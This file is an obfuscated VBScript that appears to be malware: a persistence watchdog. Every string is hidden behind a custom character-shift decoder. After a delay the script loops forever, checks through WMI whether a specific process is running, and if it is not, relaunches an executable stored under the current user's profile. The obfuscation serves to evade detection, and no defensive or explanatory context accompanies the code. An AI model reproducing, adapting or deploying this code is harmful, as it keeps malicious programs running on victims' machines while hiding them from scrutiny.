moWNOF3qf = "."
yYlzs886 = CreateObject(zjfLm0ij("^D}M9IoYrha_xfej^$/D;[cjzmoeghyaSJ")).UserName
dim c85WB4
c85WB4 = true
wscript.sleep 300000
Do while c85WB4
lTyaTmW04 = false
kYh4t0 = "."
Set bgfgb345 = GetObject(zjfLm0ij("9&Pmm_Fdhc:]0cZjWi`0ZRVR(B") & kYh4t0 & zjfLm0ij("!rzR^huePeDj[ROYN_Ac5lK(ak"))
hsvLI6 = zjfLm0ij("f$`Ir;sB:;<9>Jx0") + " " + zjfLm0ij("l;j~b(") + " " +  zjfLm0ij("|MR<)H|ETC<+") + " " +  zjfLm0ij("2zeMV_9dQ){(FUIF5hJeLY""[Ki&iu+")
Set pHaR300s = bgfgb345.ExecQuery(hsvLI6)
For Each kvdzKG2WS In pHaR300s
    if kvdzKG2WS.name = zjfLm0ij("|/Gmx_Gd$hBWQh\#]n},O*@#x,9&W(\$V[zn}[8R") Then
        lTyaTmW04 = True
    end if
Next

Set seF8f157 = CreateObject(zjfLm0ij("(twI]YHhx_kf7j9_idL]o$n<8_hb&[%I1oQiOj![nc4EcXg`\[sY^j=,"))
Set iAnFl91Sa = CreateObject(zjfLm0ij("?=ZI]YZhb_xfFjE_KdU]""$9<r_Lb0[WIzoEi*jo[;cIE1X<`'[dYPjxR"))
Set iBGN34I2y = W.CreateObject(zjfLm0ij(">%)M0ITY""hK_Uf/j*$iI*^>[Qb!b4n")) 
wscript.sleep 60000
hbf1GR = zjfLm0ij("""|x9|0jRPK'iY[|hti:R6e")+ yYlzs886 + zjfLm0ij("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + zjfLm0ij(";l4mh_ldfh0WvhS#4n|,(*L#A,&&V(""$v[{n<[eB")
pWt0Qixu = zjfLm0ij("@pA9z07R`KIi1[Bh;i#RL[")+ yYlzs886 + zjfLm0ij("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + zjfLm0ij("},8-dpOnRWO$sZVbqb&f")
if iAnFl91Sa.FileExists(pWt0Qixu) then
If seF8f157.FileExists(hbf1GR) Then
    if lTyaTmW04 = false then
        iBGN34I2y.Run hbf1GR, 1, false
    end if
end if
end if
wscript.sleep 1000
Loop


Private Function zjfLm0ij(dZN43sPgYj)
    Const n5l5s74n = 10
    Const aolXKlg8 = 33
    Const k9gOPGHJ = 126

    If Len(dZN43sPgYj) < 5 Then
        zjfLm0ij = ""
        Exit Function
    End If
    Dim p93Wo0
    dZN43sPgYj = Mid(dZN43sPgYj,3,Len(dZN43sPgYj)-4)
    For i=2 To Len(dZN43sPgYj) Step 2
        nGTaaLGwns = Asc(Mid(dZN43sPgYj,i,1)) + n5l5s74n
        If nGTaaLGwns > k9gOPGHJ Then
            nGTaaLGwns = nGTaaLGwns - k9gOPGHJ + aolXKlg8 - 1
        End If
        p93Wo0 = p93Wo0 & Chr(nGTaaLGwns)
    Next
    zjfLm0ij = p93Wo0

End Function


